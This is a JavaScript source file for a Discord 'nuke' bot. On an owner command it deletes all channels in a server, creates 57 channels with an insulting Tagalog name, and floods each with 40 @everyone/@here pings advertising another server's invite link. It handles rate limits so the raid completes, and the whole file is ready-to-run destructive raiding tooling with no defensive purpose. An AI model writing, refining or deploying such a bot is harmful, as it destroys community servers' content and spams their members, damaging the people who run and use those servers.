// index.js
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
require('dotenv').config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_ID = process.env.OWNER_ID; // Your Discord User ID
const TOKEN = process.env.TOKEN;

if (!TOKEN || !OWNER_ID) {
  console.error('Missing TOKEN or OWNER_ID in environment variables');
  process.exit(1);
}

// Message content to send
const MESSAGE_CONTENT = `@everyone @here Lipad server mga kumag! https://discord.gg/qWD57gU7S __script__ . ~~boost~~ ||@everyone|| ||@here||`;

// Helper: delay (ms)
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Send messages with rate limit handling
async function sendMassMessages(channel, count = 40) {
  let successCount = 0;
  for (let i = 0; i < count; i++) {
    try {
      await channel.send(MESSAGE_CONTENT);
      successCount++;
      await delay(200); // 200ms delay to avoid rate limits
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retryAfter * 1000;
        console.log(`Rate limited, waiting ${retryAfter}ms`);
        await delay(retryAfter);
        i--; // retry this message
      } else {
        console.error(`Failed to send message ${i + 1}:`, error.message);
      }
    }
  }
  console.log(`Sent ${successCount}/${count} messages in #${channel.name}`);
}

// Delete all channels in a guild (with delay to avoid rate limits)
async function deleteAllChannels(guild) {
  const channels = guild.channels.cache;
  console.log(`Deleting ${channels.size} channels...`);
  
  for (const channel of channels.values()) {
    try {
      await channel.delete();
      console.log(`Deleted channel: ${channel.name}`);
      await delay(300); // 300ms delay between deletions
    } catch (error) {
      console.error(`Failed to delete ${channel.name}:`, error.message);
    }
  }
  console.log('All channels deleted.');
}

// Create 57 text channels quickly with rate limit handling
async function createChannels(guild, count = 57) {
  const channelsCreated = [];
  for (let i = 1; i <= count; i++) {
    const channelName = `lipad-server-mga-kumag-${i}`;
    try {
      const channel = await guild.channels.create({
        name: channelName,
        type: ChannelType.GuildText,
        permissionOverwrites: [
          {
            id: guild.roles.everyone,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
          },
        ],
      });
      console.log(`Created channel #${channelName}`);
      channelsCreated.push(channel);
      await delay(300); // 300ms delay between creations
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retryAfter * 1000;
        console.log(`Rate limit on creation, waiting ${retryAfter}ms`);
        await delay(retryAfter);
        i--; // retry this channel
      } else {
        console.error(`Failed to create channel ${channelName}:`, error.message);
      }
    }
  }
  return channelsCreated;
}

// Main nuke function
async function nukeGuild(guild) {
  console.log(`🔥 Nuke initiated on ${guild.name} (${guild.id})`);
  
  // 1. Delete all existing channels
  await deleteAllChannels(guild);
  
  // 2. Create 57 new text channels
  const newChannels = await createChannels(guild, 57);
  
  // 3. Send 40 mass ping messages in each channel
  for (const channel of newChannels) {
    await sendMassMessages(channel, 40);
    await delay(500); // small break between channels
  }
  
  console.log('✅ Nuke completed successfully!');
}

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  // Ignore bots and non-command messages
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;
  
  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  
  if (command === 'nuke') {
    // Security: Only bot owner can execute
    if (message.author.id !== OWNER_ID) {
      return message.reply('❌ You are not authorized to use this command.');
    }
    
    // Optional confirmation to prevent accidents
    if (args[0] !== 'confirm') {
      return message.reply('⚠️ This will **DELETE ALL CHANNELS** and create 57 new channels with 40 mass ping messages each. Type `!nuke confirm` to proceed.');
    }
    
    const guild = message.guild;
    if (!guild) return message.reply('This command only works in a server.');
    
    // Acknowledge command
    await message.reply('💣 Nuking server... deleting all channels and creating chaos.');
    
    try {
      await nukeGuild(guild);
    } catch (error) {
      console.error('Nuke error:', error);
      // Attempt to send error to a fallback channel (if exists)
      try {
        const systemChannel = guild.systemChannel;
        if (systemChannel) await systemChannel.send(`❌ Nuke failed: ${error.message}`);
      } catch (e) {}
    }
  }
});

client.login(TOKEN);
